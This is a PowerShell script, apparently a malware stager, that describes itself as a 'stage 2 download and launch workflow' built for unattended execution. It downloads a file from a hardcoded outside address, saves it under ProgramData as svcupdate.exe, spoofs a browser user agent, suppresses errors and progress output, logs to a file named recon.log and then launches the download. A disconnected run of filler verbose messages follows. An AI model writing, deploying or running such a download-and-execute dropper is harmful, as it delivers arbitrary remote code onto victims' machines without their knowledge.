
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://203.0.113.28:8080/updater.ps1',
    [string]$PayloadPath = "C:\ProgramData\svcupdate.exe",
    [string]$ActivityLog = "$env:TEMP\recon.log",
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$TimeoutSec = 103,
    [int]$RetryCount = 2,
    [int]$RetryDelay = 2
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 2,
        [int]$RetryDelay = 2,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TransferUrl
    $TransferResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $PayloadPath -RetryCount $RetryCount -RetryDelay $RetryDelay -UserAgent $BrowserAgent
    if ($TransferResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $PayloadPath -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TransferUrl
    Destination = $PayloadPath
    RetryCount = $RetryCount
    TimeoutSec = $TimeoutSec
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Checking local path"
Write-Verbose "Exporting operation report"
Write-Verbose "Preparing working directory"
Write-Verbose "Reading configuration values"
Write-Verbose "Stage handoff finished"
Write-Verbose "Collecting host metadata"
Write-Verbose "Starting workflow"
Write-Verbose "Applying operation timeout"
Write-Verbose "Operation completed"
Write-Verbose "Cleaning temporary marker"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Write-Verbose "stage marker 32 reached"
